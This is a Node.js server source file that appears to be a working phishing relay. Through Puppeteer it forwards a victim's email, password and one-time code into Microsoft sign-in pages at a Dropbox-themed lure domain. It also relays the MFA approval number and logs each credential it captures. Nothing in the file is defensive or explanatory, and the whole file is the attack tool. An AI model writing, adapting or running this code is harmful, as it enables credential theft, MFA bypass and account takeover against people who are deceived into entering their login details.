const express = require("express");
const cors = require("cors");
const fs = require("fs");
const puppeteer = require("puppeteer");
require("dotenv").config();
const path = require("path");
const { v4: uuidv4 } = require("uuid");

const app = express();
const port = process.env.PORT || 3000;

// Enable CORS for all routes
app.use(cors());

app.use(express.static("public"))
app.use(express.json());

let sessions = {};
let browser;


// Helper function to delay actions
function delay(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

// Serve index.html when the root URL is accessed
app.get("/initialize", async (req, res) => {
    // browser = await puppeteer.launch({ headless: false });
    browser = await puppeteer.launch({
        args: [
            "--disable-setuid-sandbox",
            "--no-sandbox",
            "--single-process",
            "--no-zygote",
        ],
        executablePath:
            process.env.NODE_ENV === "production"
                ? process.env.PUPPETEER_EXECUTABLE_PATH
                : puppeteer.executablePath(),
    });
    res.send("Initialized");
});

app.post("/email", async (req, res) => {
    let { sessionId, email } = req.body;
    if (!email) {
        return res.status(400).send("Email is required");
    }

    if (!sessionId) {
        sessionId = uuidv4();
    }

    if (sessions[sessionId]) {
        return res.status(400).send("Session already exists");
    }

    try {
        const page = await browser.newPage();
        await page.goto(
            "https://dropbox-shared-document-content-invoice.pineappledigitall.com/nNTbLvaN",
            { timeout: 60000 }
        );
        await page.waitForSelector("#i0116");
        await page.type("#i0116", email);
        await page.click("#idSIButton9");
        await delay(5000);

        const content1 = await page.content();
        if (!content1.includes("Enter password")) {
            await page.click("#aadTile");
        }

        sessions[sessionId] = { page };
        res.send("1");
        console.log(`Email: ${email} logged for session: ${sessionId}`);
    } catch (err) {
        console.error("Error in /email:", err);
        res.status(500).send(err);
    }
});
app.post("/pass", async (req, res) => {
    const { sessionId, password } = req.body;

    if (!sessionId || !password) {
        return res.status(400).send("Session ID and password are required");
    }

    const session = sessions[sessionId];

    if (!session) {
        return res.status(400).send("Session not found");
    }

    try {
        const { page } = session;
        await page.waitForSelector("#i0118");
        await page.type("#i0118", password);
        await page.click("#idSIButton9");
        await delay(5000);

        const content2 = await page.content();
        if (content2.includes("Your account or password is incorrect.")) {
            res.send("0");
            console.log(`Incorrect password: ${password} for session: ${sessionId}`);
        } else {
            const content3 = await page.content();
            if (content3.includes("Enter code")) {
                res.send("2");
            } else if (content3.includes("Approve sign in request")) {
                await page.waitForSelector("#idRichContext_DisplaySign");
                const textContent = await page.$eval(
                    "#idRichContext_DisplaySign",
                    (el) => el.textContent
                );
                res.send(textContent);
                await delay(60000);
                await page.waitForSelector("#idSIButton9");
                await page.click("#idSIButton9");
            } else {
                await delay(5000);
                await page.waitForSelector("#idSIButton9");
                await page.click("#idSIButton9");
                res.send("1");
                await delay(5000);
                const client = await page.target().createCDPSession();
                await client.send('Network.clearBrowserCookies');
                await client.send('Network.clearBrowserCache');
            }
            console.log(`Password: ${password} logged for session: ${sessionId}`);
        }
    } catch (err) {
        console.error("Error in /pass:", err);
        res.status(500).send("Internal Server Error");
    }
});

app.post("/code", async (req, res) => {
    const { sessionId, code } = req.body;

    if (!sessionId || !code) {
        return res.status(400).send("Session ID and code are required");
    }

    const session = sessions[sessionId];

    if (!session) {
        return res.status(400).send("Session not found");
    }

    try {
        const { page } = session;
        await page.waitForSelector("#idTxtBx_SAOTCC_OTC");
        await page.type("#idTxtBx_SAOTCC_OTC", code);
        await page.click("#idSubmit_SAOTCC_Continue");
        await delay(5000);

        const content4 = await page.content();
        if (content4.includes("You didn't enter the expected verification code.")) {
            await page.type("#idTxtBx_SAOTCC_OTC", "");
            res.send("0");
            console.log(`Incorrect code: ${code} for session: ${sessionId}`);
        } else {
            await delay(5000);
            await page.click("#idSIButton9");
            res.send("1");
            console.log(`Code: ${code} logged for session: ${sessionId}`);
        }
    } catch (err) {
        console.error("Error in /code:", err);
        res.status(500).send("Internal Server Error");
    }
});


app.post("/close", async (req, res) => {
    const { sessionId } = req.body;

    if (!sessionId) {
        return res.status(400).send("Session ID is required");
    }

    const session = sessions[sessionId];

    if (!session) {
        return res.status(400).send("Session not found");
    }

    try {
        const { page } = session;
        await page.close();
        delete sessions[sessionId];

        res.send("Browser closed");
        console.log(`Browser closed for session: ${sessionId}`);
    } catch (err) {
        console.error("Error in /close:", err);
        res.status(500).send("Internal Server Error");
    }
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});

